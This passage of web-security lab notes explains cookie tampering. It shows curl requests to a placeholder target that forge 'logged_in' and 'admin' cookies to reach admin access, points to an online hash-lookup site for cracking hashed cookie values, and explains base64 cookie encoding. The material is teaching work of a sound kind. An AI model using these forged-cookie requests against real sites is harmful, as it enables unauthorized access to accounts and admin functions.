### Plain Text
**Example, if these were the cookie set after a successful login:**
	`Set-Cookie: logged_in=true; Max-Age=3600; Path=/`
	`Set-Cookie: admin=false; Max-Age=3600; Path=/`
We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

**Requesting the target page:**
```
curl http://TARGET-IP/cookie-test
```
Message returned: **Not Logged In**

**Send another request with the `logged_in` cookie set to true and the `admin` cookie set to false:**
```
curl -H "Cookie: logged_in=true; admin=false" http://TARGET-IP/cookie-test
```
Message returned: **Logged In As A User**

**One last request setting both the `logged_in` and `admin` cookie to true:**
```
curl -H "Cookie: logged_in=true; admin=true" http://TARGET-IP/cookie-test
```
Message returned: **Logged In As An Admin**

### Hashing
Sometimes cookie values are hashed which are `irreversible`. Use [this tool](https://crackstation.net/), which is helpful to reverse the hash that keeps databases of billions of hashes and their original strings.

### Encoding
Encoding is similar to hashing, but in fact, the encoding is `reversible`.  

So, what is the point of encoding?
Encoding allows us to `convert binary data into human-readable text` that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

**Example:**
`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`
